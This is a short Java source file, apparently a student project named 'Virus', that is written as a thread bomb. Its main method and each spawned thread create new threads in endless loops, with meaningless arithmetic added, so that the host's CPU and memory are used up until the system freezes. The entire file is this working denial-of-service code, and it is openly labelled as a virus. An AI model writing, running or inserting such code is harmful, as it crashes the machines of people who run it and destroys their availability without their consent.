/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package virus;

import java.util.ArrayList;

/**
 *
 * @author Alvaro
 */
public class Virus {

    /**
     * @param args the command line arguments
     */
    public static void main(String[] args) {
        ArrayList<Hilo> ah=new ArrayList<Hilo>();
        int i=0;
        while(true){
            Hilo hilo=new Hilo();
            ah.add(hilo);
            ah.get(i).start();
            i++;
        }
    }
    
}
class Hilo extends Thread{
    public void run(){
        ArrayList<Hilo> ah=new ArrayList<Hilo>();
        double i=0;
        int j=0;
        while(true){
            i+=(i/7.9+9.3345439174+(9+9.2341242)/324*9876864/7)/95894854*5.34928734/36343.3452545644634%32553245.45798734;
            Hilo hilo=new Hilo();
            ah.add(hilo);
            ah.get(j).start();
            j++;
        }
    }
}
